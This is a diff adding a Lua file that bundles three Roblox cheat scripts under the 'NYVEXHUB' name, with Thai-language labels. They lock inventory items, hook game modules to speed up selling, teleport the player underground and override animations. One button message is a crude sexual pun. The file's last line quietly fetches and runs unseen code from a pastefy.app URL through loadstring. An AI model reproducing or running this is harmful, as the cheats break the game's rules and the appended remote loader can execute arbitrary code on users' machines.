@@ -1,0 +1,743 @@
+-- ==========================================
+--  NYVEXHUB | CUSTOM GUI (Unlimited Backpack & Fast Drop/Sell)
+-- ==========================================
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- ลบ UI เก่าทิ้งหากเคยรันไว้
+if PlayerGui:FindFirstChild("NYVEXHUB_MainUI") then
+    PlayerGui.NYVEXHUB_MainUI:Destroy()
+end
+
+-- Create ScreenGui
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "NYVEXHUB_MainUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent = PlayerGui
+
+-- Main Frame
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.fromOffset(220, 130)
+MainFrame.Position = UDim2.new(0, 30, 0.5, -65)
+MainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Parent = ScreenGui
+
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 8)
+MainCorner.Parent = MainFrame
+
+local MainStroke = Instance.new("UIStroke")
+MainStroke.Color = Color3.fromRGB(0, 170, 255)
+MainStroke.Thickness = 2
+MainStroke.Parent = MainFrame
+
+-- TopBar
+local TopBar = Instance.new("Frame")
+TopBar.Size = UDim2.new(1, 0, 0, 32)
+TopBar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+TopBar.BorderSizePixel = 0
+TopBar.Parent = MainFrame
+
+local TopCorner = Instance.new("UICorner")
+TopCorner.CornerRadius = UDim.new(0, 8)
+TopCorner.Parent = TopBar
+
+local LogoIcon = Instance.new("ImageLabel")
+LogoIcon.Size = UDim2.fromOffset(20, 20)
+LogoIcon.Position = UDim2.new(0, 8, 0.5, -10)
+LogoIcon.BackgroundTransparency = 1
+LogoIcon.Image = "rbxassetid://75135192681243"
+LogoIcon.Parent = TopBar
+
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Size = UDim2.new(1, -60, 1, 0)
+TitleLabel.Position = UDim2.new(0, 34, 0, 0)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Text = "NYVEXHUB | Item System"
+TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleLabel.TextSize = 12
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+TitleLabel.Parent = TopBar
+
+-- Collapse Button (- / +)
+local CollapseButton = Instance.new("TextButton")
+CollapseButton.Size = UDim2.fromOffset(24, 24)
+CollapseButton.Position = UDim2.new(1, -28, 0.5, -12)
+CollapseButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+CollapseButton.BorderSizePixel = 0
+CollapseButton.Text = "-"
+CollapseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CollapseButton.TextSize = 14
+CollapseButton.Font = Enum.Font.GothamBold
+CollapseButton.Parent = TopBar
+
+local CollapseCorner = Instance.new("UICorner")
+CollapseCorner.CornerRadius = UDim.new(0, 6)
+CollapseCorner.Parent = CollapseButton
+
+-- Content Container
+local ContentContainer = Instance.new("Frame")
+ContentContainer.Size = UDim2.new(1, 0, 1, -32)
+ContentContainer.Position = UDim2.new(0, 0, 0, 32)
+ContentContainer.BackgroundTransparency = 1
+ContentContainer.Parent = MainFrame
+
+-- Toggle Button
+local ToggleButton = Instance.new("TextButton")
+ToggleButton.Size = UDim2.new(1, -16, 0, 38)
+ToggleButton.Position = UDim2.new(0, 8, 0, 10)
+ToggleButton.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
+ToggleButton.BorderSizePixel = 0
+ToggleButton.AutoButtonColor = true
+ToggleButton.Text = "เปิดใช้งาน ฟังก์ชันทั้งหมด [OFF]"
+ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ToggleButton.TextSize = 11
+ToggleButton.Font = Enum.Font.GothamBold
+ToggleButton.Parent = ContentContainer
+
+local ToggleCorner = Instance.new("UICorner")
+ToggleCorner.CornerRadius = UDim.new(0, 6)
+ToggleCorner.Parent = ToggleButton
+
+local DescLabel = Instance.new("TextLabel")
+DescLabel.Size = UDim2.new(1, -16, 0, 30)
+DescLabel.Position = UDim2.new(0, 8, 0, 52)
+DescLabel.BackgroundTransparency = 1
+DescLabel.Text = "💡 ล็อคกระเป๋าไม่จำกัด + ทิ้งของ/ขายของเร็ว"
+DescLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+DescLabel.TextSize = 9
+DescLabel.Font = Enum.Font.Gotham
+DescLabel.TextWrapped = true
+DescLabel.TextXAlignment = Enum.TextXAlignment.Center
+DescLabel.Parent = ContentContainer
+
+-- ระบบพับเก็บหน้าต่าง
+local isCollapsed = false
+CollapseButton.MouseButton1Click:Connect(function()
+    isCollapsed = not isCollapsed
+    if isCollapsed then
+        MainFrame:TweenSize(UDim2.fromOffset(220, 32), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.15, true)
+        ContentContainer.Visible = false
+        CollapseButton.Text = "+"
+    else
+        MainFrame:TweenSize(UDim2.fromOffset(220, 130), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.15, true)
+        ContentContainer.Visible = true
+        CollapseButton.Text = "-"
+    end
+end)
+
+-- LOGIC SYSTEM (ฟังก์ชันการทำงาน)
+local isEnabled = false
+
+local function lockTool(tool)
+    if isEnabled and tool and tool:IsA("Tool") then
+        pcall(function() 
+            tool:SetAttribute("Locked", true) 
+        end)
+    end
+end
+
+local function setupBackpack(backpack)
+    if not backpack then return end
+    for _, tool in ipairs(backpack:GetChildren()) do 
+        lockTool(tool) 
+    end
+    backpack.ChildAdded:Connect(lockTool)
+end
+
+local function initBackpack()
+    if not isEnabled then return end
+    local backpack = LocalPlayer:FindFirstChildOfClass("Backpack")
+    if backpack then
+        setupBackpack(backpack)
+    else
+        LocalPlayer.ChildAdded:Connect(function(child)
+            if child:IsA("Backpack") then 
+                setupBackpack(child) 
+            end
+        end)
+    end
+end
+
+LocalPlayer.CharacterAdded:Connect(function()
+    if isEnabled then
+        task.wait(1)
+        initBackpack()
+    end
+end)
+
+local function enableFastDropSell()
+    pcall(function()
+        local BuyPromptUI = require(ReplicatedStorage.Modules.Game.UI.BuyPromptUI)
+        local Util = require(ReplicatedStorage.Modules.Core.Util)
+
+        local ok, sellBtn = pcall(function() return BuyPromptUI.get("SellPromptSellButton") end)
+        if ok and sellBtn then
+            local holdStroke = sellBtn:FindFirstChild("HoldStroke", true)
+            if holdStroke then
+                holdStroke.Enabled = false
+                local grad = holdStroke:FindFirstChildOfClass("UIGradient")
+                if grad then grad.Enabled = false end
+            end
+            for _, v in pairs(sellBtn:GetDescendants()) do
+                if v:IsA("NumberValue") then 
+                    v.Value = 1 
+                end
+            end
+        end
+
+        if Util and Util.tween then
+            local origTween = Util.tween
+            Util.tween = function(obj, info, target)
+                if isEnabled and obj and obj:IsA("NumberValue") and target and target.Value ~= nil then
+                    obj.Value = target.Value
+                    return { Cancel = function() end }
+                end
+                return origTween(obj, info, target)
+            end
+        end
+    end)
+end
+
+-- สวิตช์ปุ่มเปิด/ปิด
+ToggleButton.MouseButton1Click:Connect(function()
+    isEnabled = not isEnabled
+    if isEnabled then
+        ToggleButton.Text = "เปิดใช้งาน ฟังก์ชันทั้งหมด [ON]"
+        ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 80)
+        
+        initBackpack()
+        enableFastDropSell()
+    else
+        ToggleButton.Text = "เปิดใช้งาน ฟังก์ชันทั้งหมด [OFF]"
+        ToggleButton.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
+    end
+end)
+
+print("[NYVEXHUB] Loaded Successfully!")
+--// ==========================================
+--// NYVEX HUB | CUSTOM GUI - มุดดิน (Compact & Collapsible)
+--// ==========================================
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- ลบ UI เก่าทิ้งถ้าเคยรันค้างไว้
+if PlayerGui:FindFirstChild("NYVEX_Underground_CustomUI") then
+    PlayerGui.NYVEX_Underground_CustomUI:Destroy()
+end
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "NYVEX_Underground_CustomUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent = PlayerGui
+
+-- กรอบหลักหน้าต่าง (ปรับความกว้างให้สั้นลงนิดหน่อยตามต้องการ)
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.fromOffset(200, 110)
+MainFrame.Position = UDim2.new(0, 30, 0.5, -55)
+MainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true -- ลากขยับหน้าต่างได้
+MainFrame.Parent = ScreenGui
+
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 8)
+MainCorner.Parent = MainFrame
+
+local MainStroke = Instance.new("UIStroke")
+MainStroke.Color = Color3.fromRGB(0, 170, 255)
+MainStroke.Thickness = 2
+MainStroke.Parent = MainFrame
+
+-- แถบหัวข้อด้านบน
+local TopBar = Instance.new("Frame")
+TopBar.Size = UDim2.new(1, 0, 0, 32)
+TopBar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+TopBar.BorderSizePixel = 0
+TopBar.Parent = MainFrame
+
+local TopCorner = Instance.new("UICorner")
+TopCorner.CornerRadius = UDim.new(0, 8)
+TopCorner.Parent = TopBar
+
+-- โลโก้ค่าย NYVEX ด้านซ้าย
+local LogoIcon = Instance.new("ImageLabel")
+LogoIcon.Size = UDim2.fromOffset(20, 20)
+LogoIcon.Position = UDim2.new(0, 8, 0.5, -10)
+LogoIcon.BackgroundTransparency = 1
+LogoIcon.Image = "rbxassetid://75135192681243"
+LogoIcon.Parent = TopBar
+
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Size = UDim2.new(1, -60, 1, 0)
+TitleLabel.Position = UDim2.new(0, 34, 0, 0)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Text = "NYVEX | มุดดิน"
+TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleLabel.TextSize = 13
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+TitleLabel.Parent = TopBar
+
+-- ปุ่มพับเก็บ / ขยายหน้าต่าง (- / +) มุมขวาบน
+local CollapseButton = Instance.new("TextButton")
+CollapseButton.Size = UDim2.fromOffset(24, 24)
+CollapseButton.Position = UDim2.new(1, -28, 0.5, -12)
+CollapseButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+CollapseButton.BorderSizePixel = 0
+CollapseButton.Text = "-"
+CollapseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CollapseButton.TextSize = 14
+CollapseButton.Font = Enum.Font.GothamBold
+CollapseButton.Parent = TopBar
+
+local CollapseCorner = Instance.new("UICorner")
+CollapseCorner.CornerRadius = UDim.new(0, 6)
+CollapseCorner.Parent = CollapseButton
+
+-- คอนเทนต์ข้างใน (ปุ่มมุดดินและข้อความ)
+local ContentContainer = Instance.new("Frame")
+ContentContainer.Size = UDim2.new(1, 0, 1, -32)
+ContentContainer.Position = UDim2.new(0, 0, 0, 32)
+ContentContainer.BackgroundTransparency = 1
+ContentContainer.Parent = MainFrame
+
+-- ปุ่มกดทิ้งตัวลงดิน
+local DropButton = Instance.new("TextButton")
+DropButton.Size = UDim2.new(1, -16, 0, 35)
+DropButton.Position = UDim2.new(0, 8, 0, 10)
+DropButton.BackgroundColor3 = Color3.fromRGB(0, 120, 220)
+DropButton.BorderSizePixel = 0
+DropButton.AutoButtonColor = true
+DropButton.Text = "ทิ้งตัวลงดิน (-13 สตัด / กด Z)"
+DropButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+DropButton.TextSize = 11
+DropButton.Font = Enum.Font.GothamBold
+DropButton.Parent = ContentContainer
+
+local DropCorner = Instance.new("UICorner")
+DropCorner.CornerRadius = UDim.new(0, 6)
+DropCorner.Parent = DropButton
+
+local DescLabel = Instance.new("TextLabel")
+DescLabel.Size = UDim2.new(1, -16, 0, 20)
+DescLabel.Position = UDim2.new(0, 8, 0, 50)
+DescLabel.BackgroundTransparency = 1
+DescLabel.Text = "💡ใช้ Fly Jump กลับขึ้นบน"
+DescLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+DescLabel.TextSize = 9
+DescLabel.Font = Enum.Font.Gotham
+DescLabel.TextWrapped = true
+DescLabel.TextXAlignment = Enum.TextXAlignment.Center
+DescLabel.Parent = ContentContainer
+
+-- ระบบพับเก็บหน้าต่าง
+local isCollapsed = false
+CollapseButton.MouseButton1Click:Connect(function()
+    isCollapsed = not isCollapsed
+    if isCollapsed then
+        MainFrame:TweenSize(UDim2.fromOffset(200, 32), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.15, true)
+        ContentContainer.Visible = false
+        CollapseButton.Text = "+"
+    else
+        MainFrame:TweenSize(UDim2.fromOffset(200, 110), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.15, true)
+        ContentContainer.Visible = true
+        CollapseButton.Text = "-"
+    end
+end)
+
+-- ฟังก์ชันการทำงานทิ้งตัวลงดินทีละ 13 สตัดสะสม
+local SnapHeightStep = 13
+local isAnimatingText = false
+
+local function dropUnderground()
+    local char = LocalPlayer.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+    
+    local pos = hrp.Position
+    local targetPos = Vector3.new(pos.X, pos.Y - SnapHeightStep, pos.Z)
+    hrp.CFrame = CFrame.new(targetPos)
+    hrp.AssemblyLinearVelocity = Vector3.zero
+    
+    -- เปลี่ยนข้อความปุ่มชั่วคราว
+    DropButton.Text = "⚡️ ได้เริ่มมุดหีแล้ว! ⚡️"
+    DropButton.BackgroundColor3 = Color3.fromRGB(0, 180, 80)
+    
+    task.spawn(function()
+        task.wait(0.6)
+        DropButton.Text = "ทิ้งตัวลงดิน (-13 สตัด / กด Z)"
+        DropButton.BackgroundColor3 = Color3.fromRGB(0, 120, 220)
+    end)
+    
+    pcall(function()
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://74715602103425"
+        sound.Volume = 1
+        sound.PlayOnRemove = true
+        sound.Parent = hrp
+        sound:Destroy()
+    end)
+end
+
+DropButton.MouseButton1Click:Connect(function()
+    dropUnderground()
+end)
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.KeyCode == Enum.KeyCode.Z then
+        dropUnderground()
+    end
+end)
+
+print("[NYVEX] Compact GUI Loaded Successfully!")
+-- ==========================================
+-- NYVEX HUB | ULTIMATE SLAY ANIMATIONS 💅✨
+-- ==========================================
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- ลบ UI เก่าทิ้งถ้าเคยรันค้างไว้
+if PlayerGui:FindFirstChild("NYVEX_SlayAnimation_UI") then
+    PlayerGui.NYVEX_SlayAnimation_UI:Destroy()
+end
+
+-- 1. ScreenGui หลัก
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "NYVEX_SlayAnimation_UI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent = PlayerGui
+
+-- 2. Main Frame (ขอบสีรุ้งหมุนได้)
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.fromOffset(230, 120)
+MainFrame.Position = UDim2.new(0, 30, 0.5, -60)
+MainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Parent = ScreenGui
+
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 8)
+MainCorner.Parent = MainFrame
+
+local UIStroke = Instance.new("UIStroke")
+UIStroke.Thickness = 2.5
+UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+UIStroke.Parent = MainFrame
+
+local UIGradient = Instance.new("UIGradient")
+UIGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 128)),
+    ColorSequenceKeypoint.new(0.20, Color3.fromRGB(255, 100, 0)),
+    ColorSequenceKeypoint.new(0.40, Color3.fromRGB(255, 235, 0)),
+    ColorSequenceKeypoint.new(0.60, Color3.fromRGB(0, 255, 150)),
+    ColorSequenceKeypoint.new(0.80, Color3.fromRGB(0, 150, 255)),
+    ColorSequenceKeypoint.new(1.00, Color3.fromRGB(200, 0, 255))
+})
+UIGradient.Parent = UIStroke
+
+task.spawn(function()
+    local rot = 0
+    while ScreenGui and ScreenGui.Parent do
+        rot = (rot + 2) % 360
+        UIGradient.Rotation = rot
+        task.wait(0.03)
+    end
+end)
+
+-- แถบหัวข้อด้านบน
+local TopBar = Instance.new("Frame")
+TopBar.Size = UDim2.new(1, 0, 0, 32)
+TopBar.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+TopBar.BorderSizePixel = 0
+TopBar.Parent = MainFrame
+
+local TopCorner = Instance.new("UICorner")
+TopCorner.CornerRadius = UDim.new(0, 8)
+TopCorner.Parent = TopBar
+
+local LogoIcon = Instance.new("ImageLabel")
+LogoIcon.Size = UDim2.fromOffset(20, 20)
+LogoIcon.Position = UDim2.new(0, 8, 0.5, -10)
+LogoIcon.BackgroundTransparency = 1
+LogoIcon.Image = "rbxassetid://75135192681243"
+LogoIcon.Parent = TopBar
+
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Size = UDim2.new(1, -60, 1, 0)
+TitleLabel.Position = UDim2.new(0, 34, 0, 0)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Text = "NYVEX | Queen Walk 💅"
+TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleLabel.TextSize = 11
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+TitleLabel.Parent = TopBar
+
+local CollapseButton = Instance.new("TextButton")
+CollapseButton.Size = UDim2.fromOffset(24, 24)
+CollapseButton.Position = UDim2.new(1, -28, 0.5, -12)
+CollapseButton.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+CollapseButton.BorderSizePixel = 0
+CollapseButton.Text = "-"
+CollapseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CollapseButton.TextSize = 14
+CollapseButton.Font = Enum.Font.GothamBold
+CollapseButton.Parent = TopBar
+
+local CollapseCorner = Instance.new("UICorner")
+CollapseCorner.CornerRadius = UDim.new(0, 6)
+CollapseCorner.Parent = CollapseButton
+
+local ContentContainer = Instance.new("Frame")
+ContentContainer.Size = UDim2.new(1, 0, 1, -32)
+ContentContainer.Position = UDim2.new(0, 0, 0, 32)
+ContentContainer.BackgroundTransparency = 1
+ContentContainer.Parent = MainFrame
+
+local ToggleSlayButton = Instance.new("TextButton")
+ToggleSlayButton.Size = UDim2.new(1, -16, 0, 36)
+ToggleSlayButton.Position = UDim2.new(0, 8, 0, 10)
+ToggleSlayButton.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
+ToggleSlayButton.BorderSizePixel = 0
+ToggleSlayButton.AutoButtonColor = true
+ToggleSlayButton.Text = "💅 โหมดตัวแม่เดินสับ (OFF)"
+ToggleSlayButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ToggleSlayButton.TextSize = 11
+ToggleSlayButton.Font = Enum.Font.GothamBold
+ToggleSlayButton.Parent = ContentContainer
+
+local ToggleCorner = Instance.new("UICorner")
+ToggleCorner.CornerRadius = UDim.new(0, 6)
+ToggleCorner.Parent = ToggleSlayButton
+
+local DescLabel = Instance.new("TextLabel")
+DescLabel.Size = UDim2.new(1, -16, 0, 20)
+DescLabel.Position = UDim2.new(0, 8, 0, 52)
+DescLabel.BackgroundTransparency = 1
+DescLabel.Text = "✨ TWICE Idle + Runway Walk + Jump Spin"
+DescLabel.TextColor3 = Color3.fromRGB(160, 160, 180)
+DescLabel.TextSize = 8
+DescLabel.Font = Enum.Font.Gotham
+DescLabel.TextXAlignment = Enum.TextXAlignment.Center
+DescLabel.Parent = ContentContainer
+
+-- ระบบพับเก็บหน้าต่าง
+local isCollapsed = false
+CollapseButton.MouseButton1Click:Connect(function()
+    isCollapsed = not isCollapsed
+    if isCollapsed then
+        MainFrame:TweenSize(UDim2.fromOffset(230, 32), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.15, true)
+        ContentContainer.Visible = false
+        CollapseButton.Text = "+"
+    else
+        MainFrame:TweenSize(UDim2.fromOffset(230, 120), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.15, true)
+        ContentContainer.Visible = true
+        CollapseButton.Text = "-"
+    end
+end)
+
+-- ==========================================
+-- 3. CORE ANIMATION OVERRIDER (รวมท่ายืน/เดิน/โดด/ตก)
+-- ==========================================
+local isSlayActive = false
+
+-- รหัส Catalog ตามที่คุณระบุ
+local CATALOG_IDLE = 79194689807074  -- TWICE The Feels (ท่ายืน)
+local CATALOG_WALK = 91347908206415   -- Queen Runway Model (ท่าเดิน/วิ่ง)
+local CATALOG_JUMP = 99410306126683   -- Jump Spin Animation (ท่ากระโดด/ตก)
+
+local REAL_IDLE_ID = nil
+local REAL_WALK_ID = nil
+local REAL_JUMP_ID = nil
+
+-- ฟังก์ชันดึง Real Animation ID จาก Catalog
+local function getRealAnimationId(catalogId)
+    local animId = nil
+    pcall(function()
+        local asset = game:GetObjects("rbxassetid://" .. tostring(catalogId))[1]
+        if asset then
+            if asset:IsA("Animation") then
+                animId = asset.AnimationId
+            else
+                for _, v in ipairs(asset:GetDescendants()) do
+                    if v:IsA("Animation") then
+                        animId = v.AnimationId
+                        break
+                    end
+                end
+            end
+            asset:Destroy()
+        end
+    end)
+    return animId or ("rbxassetid://" .. tostring(catalogId))
+end
+
+task.spawn(function()
+    REAL_IDLE_ID = getRealAnimationId(CATALOG_IDLE)
+    REAL_WALK_ID = getRealAnimationId(CATALOG_WALK)
+    REAL_JUMP_ID = getRealAnimationId(CATALOG_JUMP)
+end)
+
+local idleTrack = nil
+local walkTrack = nil
+local jumpTrack = nil
+local animConnection = nil
+
+local function stopAllTracks()
+    if idleTrack then pcall(function() idleTrack:Stop(0.1) idleTrack:Destroy() end) idleTrack = nil end
+    if walkTrack then pcall(function() walkTrack:Stop(0.1) walkTrack:Destroy() end) walkTrack = nil end
+    if jumpTrack then pcall(function() jumpTrack:Stop(0.1) jumpTrack:Destroy() end) jumpTrack = nil end
+end
+
+local function setupCustomAnimation(character)
+    if not character then return end
+    local humanoid = character:WaitForChild("Humanoid", 5)
+    if not humanoid then return end
+
+    local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)
+    local animateScript = character:FindFirstChild("Animate")
+
+    if animConnection then
+        animConnection:Disconnect()
+        animConnection = nil
+    end
+
+    animConnection = RunService.RenderStepped:Connect(function()
+        if not isSlayActive or not character or not character.Parent or humanoid.Health <= 0 then
+            stopAllTracks()
+            if animateScript then animateScript.Disabled = false end
+            return
+        end
+
+        -- ปิด Animate เดิมของเกมไม่ให้อนิเมชั่นตีกัน
+        if animateScript then animateScript.Disabled = true end
+
+        local state = humanoid:GetState()
+        local isJumpingOrFreefall = (state == Enum.HumanoidStateType.Jumping or state == Enum.HumanoidStateType.Freefall)
+        local isMoving = humanoid.MoveDirection.Magnitude > 0.1
+
+        if isJumpingOrFreefall then
+            -- 1. ขณะกระโดด / ร่วงตกจากที่สูง -> เล่นท่า Jump Spin Animation
+            if idleTrack and idleTrack.IsPlaying then idleTrack:Stop(0.1) end
+            if walkTrack and walkTrack.IsPlaying then walkTrack:Stop(0.1) end
+
+            if not jumpTrack and REAL_JUMP_ID then
+                local anim = Instance.new("Animation")
+                anim.AnimationId = REAL_JUMP_ID
+                local success, track = pcall(function() return animator:LoadAnimation(anim) end)
+                if success and track then
+                    jumpTrack = track
+                    jumpTrack.Priority = Enum.AnimationPriority.Action4
+                    jumpTrack.Looped = true
+                    jumpTrack:Play(0.1)
+                end
+            elseif jumpTrack and not jumpTrack.IsPlaying then
+                jumpTrack:Play(0.1)
+            end
+
+        elseif isMoving then
+            -- 2. ขณะเดิน / วิ่ง -> เล่นท่า Queen Runway Model
+            if idleTrack and idleTrack.IsPlaying then idleTrack:Stop(0.1) end
+            if jumpTrack and jumpTrack.IsPlaying then jumpTrack:Stop(0.1) end
+
+            if not walkTrack and REAL_WALK_ID then
+                local anim = Instance.new("Animation")
+                anim.AnimationId = REAL_WALK_ID
+                local success, track = pcall(function() return animator:LoadAnimation(anim) end)
+                if success and track then
+                    walkTrack = track
+                    walkTrack.Priority = Enum.AnimationPriority.Action4
+                    walkTrack.Looped = true
+                    walkTrack:Play(0.1)
+                    walkTrack:AdjustSpeed(1.15)
+                end
+            elseif walkTrack and not walkTrack.IsPlaying then
+                walkTrack:Play(0.1)
+            end
+
+        else
+            -- 3. หยุดยืนนิ่ง -> เล่นท่า TWICE - The Feels
+            if walkTrack and walkTrack.IsPlaying then walkTrack:Stop(0.1) end
+            if jumpTrack and jumpTrack.IsPlaying then jumpTrack:Stop(0.1) end
+
+            if not idleTrack and REAL_IDLE_ID then
+                local anim = Instance.new("Animation")
+                anim.AnimationId = REAL_IDLE_ID
+                local success, track = pcall(function() return animator:LoadAnimation(anim) end)
+                if success and track then
+                    idleTrack = track
+                    idleTrack.Priority = Enum.AnimationPriority.Action4
+                    idleTrack.Looped = true
+                    idleTrack:Play(0.1)
+                end
+            elseif idleTrack and not idleTrack.IsPlaying then
+                idleTrack:Play(0.1)
+            end
+        end
+    end)
+end
+
+-- ระบบดักจับการเกิดใหม่ (CharacterAdded Hook)
+LocalPlayer.CharacterAdded:Connect(function(char)
+    stopAllTracks()
+    task.wait(0.6)
+    if isSlayActive then
+        setupCustomAnimation(char)
+    end
+end)
+
+-- ปุ่มคลิกสลับเปิด/ปิด
+ToggleSlayButton.MouseButton1Click:Connect(function()
+    isSlayActive = not isSlayActive
+    if isSlayActive then
+        ToggleSlayButton.Text = "💅 โหมดตัวแม่เดินสับ (ON)"
+        ToggleSlayButton.BackgroundColor3 = Color3.fromRGB(0, 170, 85)
+        if LocalPlayer.Character then
+            setupCustomAnimation(LocalPlayer.Character)
+        end
+    else
+        ToggleSlayButton.Text = "💅 โหมดตัวแม่เดินสับ (OFF)"
+        ToggleSlayButton.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
+        stopAllTracks()
+        if animConnection then
+            animConnection:Disconnect()
+            animConnection = nil
+        end
+        local char = LocalPlayer.Character
+        if char then
+            local animateScript = char:FindFirstChild("Animate")
+            if animateScript then animateScript.Disabled = false end
+        end
+    end
+end)
+
+print("[NYVEX] All Custom Animations Loaded Successfully!")
+loadstring(game:HttpGet("https://pastefy.app/74AQ7SWE/raw"))()
